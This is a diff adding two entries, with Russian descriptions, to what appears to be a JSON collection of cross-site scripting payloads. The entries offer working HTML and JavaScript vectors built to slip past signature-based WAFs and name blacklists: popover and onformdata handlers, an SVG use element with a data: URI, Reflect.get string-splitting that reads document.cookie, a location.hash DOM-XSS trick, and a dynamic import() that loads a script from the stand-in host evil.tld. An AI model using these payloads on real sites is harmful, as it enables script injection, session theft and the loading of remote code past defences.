@@ -785,6 +785,22 @@
       "tags": ["mxss", "mutation", "dompurify"],
       "body": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
       "meta": "Использует квирки браузера для пересборки HTML-тегов через innerHTML-мутации. Пример Masato Kinugawa против cure53/DOMPurify на Google Search."
+    },
+    {
+      "subcategory": "Свежие векторы",
+      "title": "Современные авто-события и обёртки (popover, onformdata, import)",
+      "language": "html",
+      "tags": ["modern", "waf-bypass", "popover", "import"],
+      "body": "<!-- Popover API (HTML 2023+): ontoggle / onbeforetoggle при открытии поповера -->\n<button popovertarget=p>кликни</button><div id=p popover onbeforetoggle=alert(1)>x</div>\n\n<!-- SVG <use> с внешним data:-документом (фильтр ждёт inline <script>, а его нет) -->\n<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x\"/></svg>\n\n<!-- onformdata: срабатывает при сабмите формы -->\n<form onformdata=alert(1)><button>send</button></form>\n\n<!-- Динамический import(): грузит ES-модуль, когда eval/Function в блэклисте -->\n<img src=x onerror=\"import('//evil.tld/x.js')\">\n\n<!-- <track> внутри media -->\n<video controls><track default onerror=alert(1)></video>",
+      "meta": "Малозаметные современные векторы против сигнатурных WAF, которые ещё не знают эти теги/обработчики: Popover API (onbeforetoggle/ontoggle), <svg><use> с data:-URI, onformdata при сабмите, dynamic import() как замена eval, <track onerror>. popover/track требуют интеракции либо media-контекста."
+    },
+    {
+      "subcategory": "Свежие векторы",
+      "title": "Альтернативный вызов: Reflect.get, valueOf, hash",
+      "language": "javascript",
+      "tags": ["filter-bypass", "obfuscation", "reflect", "dom"],
+      "body": "// Reflect.get собирает имя по частям (как obj['name']), обходя блэклист имён\nReflect.get(window,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))\n\n// window.valueOf=alert + арифметика над window: неявное приведение зовёт alert\nwindow.valueOf=alert;window+1\n\n// payload уезжает в #fragment (серверный WAF его не видит, исполняется в DOM)\n<svg onload=\"location=location.hash.slice(1)\">  // открыть как ...#javascript:alert(1)",
+      "meta": "Reflect.get(obj,'name') читает свойство по собранной строке вместо точечной нотации (обход блэклиста имён функций). window.valueOf=alert и арифметика над window триггерят alert через неявное приведение к числу. location.hash.slice(1) уносит payload в #fragment, невидимый для серверного WAF (чистый DOM-XSS)."
     }
   ]
 }
